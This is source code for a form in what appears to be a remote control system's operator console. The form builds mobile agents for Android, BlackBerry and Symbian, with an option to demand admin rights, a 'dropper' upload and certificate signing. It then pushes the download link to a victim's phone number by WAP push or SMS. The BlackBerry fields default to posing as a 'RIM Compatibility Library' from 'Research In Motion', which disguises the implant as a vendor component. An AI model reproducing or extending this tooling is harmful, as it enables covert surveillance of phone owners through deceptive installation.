<?xml version="1.0" encoding="utf-8"?>
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009"
				 xmlns:s="library://ns.adobe.com/flex/spark"
				 xmlns:mx="library://ns.adobe.com/flex/mx"
				 width="100%"
				 height="100%"
				 xmlns:build="it.ht.rcs.console.operations.view.agents.build.*" creationComplete="getModems()">

	<fx:Script>
		<![CDATA[
			import it.ht.rcs.console.build.controller.BuildManager;
			import it.ht.rcs.console.build.model.SymbianConf;
			import it.ht.rcs.console.modem.controller.ModemManager;
			import it.ht.rcs.console.monitor.controller.LicenseManager;
			import it.ht.rcs.console.network.controller.CollectorManager;
			import it.ht.rcs.console.operations.view.agents.build.UploadPopup;
			import it.ht.rcs.console.operations.view.configuration.ConfigurationView;
			import it.ht.rcs.console.task.controller.DownloadManager;
			import it.ht.rcs.console.utils.AlertPopUp;

			import locale.R;

			import mx.collections.ListCollectionView;
			import mx.core.UIComponent;
			import mx.events.ValidationResultEvent;
			import mx.managers.PopUpManager;
			import mx.rpc.events.FaultEvent;
			import mx.rpc.events.ResultEvent;

			import spark.events.TextOperationEvent;

			[Bindable]
			private var urls:ListCollectionView;

			[Bindable]
			public var configView:ConfigurationView;

			private var params:Object;

			private var platforms:Array;

			private var keyReference:FileReference;

			private var android_file:Boolean=false;

			[Bindable]
			private var modems:ArrayCollection;

			public function set platform(value:*):void
			{
				if (value == 'android' || value == 'blackberry' || value == 'symbian' || value == 'multiplatform')
					currentState=value;
				else
					currentState='all';

				// get the list of entry points 
				CollectorManager.instance.refresh();
				CollectorManager.instance.getCustomRelay(onCustomRelayResponse, onCustomRelayFault)
				//urls=CollectorManager.instance.getEntryPointsView();
				//urls=CollectorManager.instance.getEntryPointsView();

				if (value == null)
					return;

				if (value == 'multiplatform')
					platforms=['blackberry', 'android', 'symbian'];
				else
					platforms=[value];

				createBtn.platforms=platforms;

				if (value == 'symbian')
				{
					if (BuildManager.instance.symbianConf == null)
						getSymbianConf()
				}

				// if rmi is in demo, override every platform
				if (LicenseManager.instance.rmi_demo)
				{
					createBtn.demo.enabled=false;
					createBtn.demo.selected=true;
				}

				// no RMI
				if (!LicenseManager.instance.rmi_demo && !LicenseManager.instance.rmi)
				{
					createBtn.enabled=false;
					createBtn.demo.enabled=false;
				}


			}
      
      private function getModems():void
      {
        modems=ModemManager.instance.getAvailableModems()
        modemCb.dataProvider=modems
        if (modems.length > 0)
        {
          createBtn.enabled=true
          modem.visible=modem.includeInLayout=true;
          noModem.visible=noModem.includeInLayout=false;
          modemCb.selectedIndex=0
        }
        else
        {
          createBtn.enabled=false
          noModem.visible=noModem.includeInLayout=true;
          modem.visible=modem.includeInLayout=false;
        }
      }

			private function onCustomRelayResponse(e:ResultEvent):void
			{
				var url:*=JSON.parse(String(e.result))

				urls=new ListCollectionView(new ArrayCollection([String(url)]))
			}

			private function onCustomRelayFault(e:FaultEvent):void
			{
				urls=CollectorManager.instance.getEntryPointsView();
			}

			private var fileReference:FileReference;

			private function browse():void
			{
				if (!params)
					params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};

				fileReference=new FileReference();
				fileReference.addEventListener(Event.SELECT, uploadCert);
				fileReference.browse([new FileFilter("Cer", "*.cer")]);
			}

			private function browse_android():void
			{
				fileReference=new FileReference();
				fileReference.addEventListener(Event.SELECT, fileSelection);
				fileReference.browse();
			}

			private function fileSelection(event:Event):void
			{
				android_file=true;
			}

			private var uploadPopup:UploadPopup;

			private function uploadCert(event:Event):void
			{
				fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
				fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
				fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
				fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadComplete);

				uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
				uploadPopup.fileReference=fileReference;
				PopUpManager.centerPopUp(uploadPopup);
			}



			private function onUploadComplete(event:DataEvent):void
			{
				PopUpManager.removePopUp(uploadPopup);
				if (!params.sign)
					params.sign={};
				params['sign']['cert']=event.data;
			}

			private function onUploadError(event:Event):void
			{
				PopUpManager.removePopUp(uploadPopup);
				AlertPopUp.show(event.type);
			}

			private function collName(o:Object):String
			{
				if (o == null)
					return 'invalid address';

				if (o.hasOwnProperty('address') && o['address'] != '')
					return "http://" + o['address'] + '/';

				return o.toString();
			}

			private function complete_with_slash(url:String):String
			{
				var ret:String=url;

				if (url.charAt(url.length - 1) != '/')
					ret+='/';

				return ret;
			}


			protected function send():void
			{
				if (String(complete_with_slash(url.textInput.text) + appname.text + text.text).length > 120)
				{
					AlertPopUp.show(R.get('MESSAGE_TOO_LONG'), R.get('ERROR'));
					return;
				}

				if (number.text.length == 0 || number.text.charAt(0) != '+')
				{
					AlertPopUp.show(R.get('MISSING_NUMBER'), R.get('ERROR'));
					return;
				}

				if (url.textInput.text.length == 0)
				{
					AlertPopUp.show(R.get('MISSING_URL'), R.get('ERROR'));
					return;
				}

				if (appname.text.length == 0)
				{
					AlertPopUp.show(R.get('MISSING_APPLICATION'), R.get('ERROR'));
					return;
				}

				if (params != null)
					params={platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: params['sign'], melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {}};
				else
					params={platform: 'wap', generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, sign: {}, melt: {appname: appname.text}, 'package': {type: 'remote'}}, deliver: {}};

				params['deliver']['number']=number.text;
        params['deliver']['modem_id']=modemCb.selectedItem._id;

				// append the subdir to the appname
				params['deliver']['link']=complete_with_slash(url.textInput.text) + appname.text + "/" + appname.text;

				if (servindication.selected)
					params['deliver']['type']='si';
				if (servloading.selected)
					params['deliver']['type']='sl';
				if (sms.selected)
					params['deliver']['type']='sms';

				params['deliver']['text']=text.text;
				params['factory']={_id: parentDocument.factory._id};


				if (currentState == 'blackberry')
				{
					params['generate']['melt']['name']=nameForm.text;
					params['generate']['melt']['desc']=descForm.text
					params['generate']['melt']['vendor']=vendorForm.text;
					params['generate']['melt']['version']=versionForm.text;
				}

				if (currentState == 'android')
				{
					params['generate']['binary']['admin']=admin.selected;
					if (android_file)
					{
						fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
						fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
						fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
						fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onUploadCompleteMelt);

						uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
						uploadPopup.fileReference=fileReference;
						PopUpManager.centerPopUp(uploadPopup);
						return;
					}
				}

				if (currentState == 'symbian')
				{
					if (!params.generate.sign)
					{
						AlertPopUp.show(R.get('MISSING_CERT'));
						return;
					}

					if (!params.generate.sign.cert)
					{
						AlertPopUp.show(R.get('MISSING_CERT'));
						return;
					}

					if (!params.generate.sign.key)
					{
						AlertPopUp.show(R.get('MISSING_KEY'));
						return;
					}

					params['generate']['sign']['edition']=edition.selectedItem;
				}

				if (currentState == 'multiplatform')
				{
					params['generate']['platforms']=['blackberry', 'android'];
				}

				DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
			}

			private function onSuccess(e:ResultEvent):void
			{
				PopUpManager.removePopUp(((parentDocument as UIComponent).parentDocument).hostComponent);
			}

			private function onFailure(e:FaultEvent):void
			{
				AlertPopUp.show(R.get('TASK_ALREADY_CREATED'));
			}

			public function getSymbianConf():void
			{

				BuildManager.instance.getSymbianConf(null, onSymbianConfResult, onSymbianConfFault)
			}

			private function onSymbianConfResult(e:ResultEvent):void
			{
				BuildManager.instance.symbianConf=e.result as SymbianConf;
			}

			private function onSymbianConfFault(e:FaultEvent):void
			{
				trace("symbian conf fault")
			}

			private function editSymbianConf():void
			{
				var symbianConf:SymbianConfigurationForm=PopUpManager.createPopUp((this.parentDocument as DisplayObject).parent, SymbianConfigurationForm, true) as SymbianConfigurationForm;
				PopUpManager.centerPopUp(symbianConf);
			}

			private function browseForKey():void
			{
				if (!params)
					params={platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}, melt: {appname: appname.text}};
				keyReference=new FileReference();
				keyReference.addEventListener(Event.SELECT, onKeySelected);
				keyReference.browse([new FileFilter("Key", "*.key")]);
			}

			private function onKeySelected(e:Event):void
			{
				uploadKey()
			}

			private function uploadKey():void
			{
				keyReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
				keyReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
				keyReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
				keyReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onKeyUploadComplete);

				uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
				uploadPopup.fileReference=keyReference;
				PopUpManager.centerPopUp(uploadPopup);
			}

			private function onKeyUploadComplete(event:DataEvent):void
			{
				PopUpManager.removePopUp(uploadPopup);
				if (!params.sign)
					params.sign={};
				params['sign']['key']=event.data;
			}

			private function onUploadCompleteMelt(event:DataEvent):void
			{
				PopUpManager.removePopUp(uploadPopup);

				params['generate']['melt']={input: event.data, appname: appname.text};

				DownloadManager.instance.createTask("build", null, params, onSuccess, onFailure);
			}

			private function onTypeSelection():void
			{
				if (sms.selected)
				{
					text.maxChars=70;
				}
			}

			protected function onTextChange():void
			{
				smsNotice.text="(max 70 char) - " + text.text.length

			}
		]]>
	</fx:Script>

	<fx:Declarations>
		<s:RadioButtonGroup id="Service"/>
	</fx:Declarations>

	<s:states>
		<s:State name='all'/>
		<s:State name='multiplatform'/>
		<s:State name='android'/>
		<s:State name='blackberry'/>
		<s:State name='symbian'/>
	</s:states>

	<s:Form left="10"
					top="10">
		<s:FormItem label="{R.get('APPLICATION_NAME')}">
			<s:TextInput id="appname"
									 restrict="^ /\\"
									 text=""/>
		</s:FormItem>
		<s:FormItem label="{R.get('MODEM')}"
								id="modem">
			<s:ComboBox id="modemCb"
									
									labelField="name"/>
		</s:FormItem>
		<s:FormItem id="noModem"
								visible="false"
								includeInLayout="false">
			<s:Label text="{R.get('NO_MODEM')}"
							 color="0xFF0000"
							 fontWeight="bold"/>
		</s:FormItem>

		<s:FormItem label="{R.get('PHONE_NUMBER')}">
			<s:TextInput id="number"
									 text=""
									 restrict="0-9+"/>
		</s:FormItem>
		<s:FormItem label="URL">
			<s:ComboBox id="url"
									dataProvider="{urls}"
									labelFunction="collName"
									requireSelection="true"
									selectedIndex="0"/>
		</s:FormItem>
		<s:FormItem label="Service Type">
			<s:HGroup>
				<s:RadioButton id="servloading"
											 label="Loading"
											 groupName="Service"
											 selected="true"
											 change="onTypeSelection()"/>
				<s:RadioButton id="servindication"
											 label="Indication"
											 groupName="Service"
											 change="onTypeSelection()"/>
				<s:RadioButton id="sms"
											 label="SMS"
											 groupName="Service"
											 change="onTypeSelection()"/>
			</s:HGroup>
		</s:FormItem>
		<s:FormItem label="{R.get('TEXT')}"
								enabled="{!servloading.selected}">
			<s:TextInput id="text"
									 text=""
									 width="180"
									 change="onTextChange()"/>
			<s:Label text="(max 70 char)"
							 fontSize="9"
							 id="smsNotice"
							 visible="{sms.selected}"
							 includeInLayout="{sms.selected}"/>
		</s:FormItem>

	</s:Form>

	<s:VGroup includeIn="android"
						left="10"
						top="240">
		<s:CheckBox left="10"
								id="admin"
								label="{R.get('REQUIRE_ADMIN')}"
								fontWeight="bold"
								selected="false"/>
		<s:TextArea left="25"
								width="280"
								height="55"
								borderVisible="false"
								contentBackgroundAlpha="0.0"
								editable="false"
								text="{R.get('REQUIRE_ADMIN_DESC')}"/>
		<s:Label text="{R.get('APPLICATION_DROPPER')}:"
						 fontWeight="bold"/>
		<s:Button width="100"
							label="{R.get('BROWSE')}..."
							click="browse_android()"/>
	</s:VGroup>

	<s:Form includeIn="blackberry"
					left="10"
					top="230">
		<s:FormItem label="{R.get('NAME')}">
			<s:TextInput id="nameForm"
									 text="RIM Compatibility Library"
									 width="150"/>
		</s:FormItem>
		<s:FormItem label="{R.get('DESCRIPTION')}">
			<s:TextInput id="descForm"
									 text="RIM Compatibility Library used by applications in the App World"
									 width="210"/>
		</s:FormItem>
		<s:FormItem label="{R.get('VENDOR')}">
			<s:TextInput id="vendorForm"
									 text="Research In Motion"
									 width="150"/>
		</s:FormItem>
		<s:FormItem label="{R.get('VERSION')}">
			<s:TextInput id="versionForm"
									 text="1.1.0"
									 width="100"/>
		</s:FormItem>
	</s:Form>

	<s:Form includeIn="symbian"
					left="10"
					top="240"
					visible="{BuildManager.instance.symbianConf.uids.length==6}">
		<s:FormItem label="{R.get('SYMBIAN_CERT')}">
			<s:Button width="80"
								label="{R.get('BROWSE')}..."
								click="browse()"/>
		</s:FormItem>
		<s:FormItem label="{R.get('SYMBIAN_KEY')}">
			<s:Button width="80"
								label="{R.get('BROWSE')}..."
								click="browseForKey()"/>
		</s:FormItem>
		<s:FormItem label="S60 Edition">
			<s:DropDownList id="edition"
											selectedIndex="0"
											width="95">
				<mx:ArrayCollection>
					<fx:String>Symbian3</fx:String>
					<fx:String>5th</fx:String>
					<fx:String>3rd</fx:String>
				</mx:ArrayCollection>
			</s:DropDownList>
		</s:FormItem>
	</s:Form>
	<!-- Symbian configuration is OK-->
	<s:HGroup includeIn="symbian"
						left="10"
						top="320"
						verticalAlign="middle"
						visible="{BuildManager.instance.symbianConf.uids.length==6}"
						includeInLayout="{BuildManager.instance.symbianConf.uids.length==6}">
		<s:Spacer height="40"/>
		<s:HGroup verticalAlign="middle">
			<s:Label text="{R.get('SYMBIAN_CONF_OK')}."/>
			<s:Label text="{R.get('SYMBIAN_CHANGE')}"
							 buttonMode="true"
							 click="editSymbianConf()"/>
		</s:HGroup>
	</s:HGroup>

	<!-- You have no Symbian configuration yet, please provide the data: -->

	<s:HGroup includeIn="symbian"
						left="10"
						top="240"
						verticalAlign="middle"
						visible="{BuildManager.instance.symbianConf.uids.length!=6}"
						includeInLayout="{BuildManager.instance.symbianConf.uids.length!=6}">
		<s:Label text="{R.get('SYMBIAN_CONF_MISSED')}"
						 color="0xFF0000"
						 fontWeight="bold"/>
		<s:Button label="{R.get('CONFIGURATION_SET')}"
							click="editSymbianConf()"/>
	</s:HGroup>

	<build:CreateWithDemoButton id="createBtn" 
															left="10"
															bottom="0"
															right="10"
															create="{send}"
															visible="{currentState=='all' || currentState=='android' || currentState=='blackberry' || currentState=='multiplatform' || (currentState=='symbian' &amp;&amp; BuildManager.instance.symbianConf.uids.length==6)}"
															configView="{configView}"/>

</s:Group>
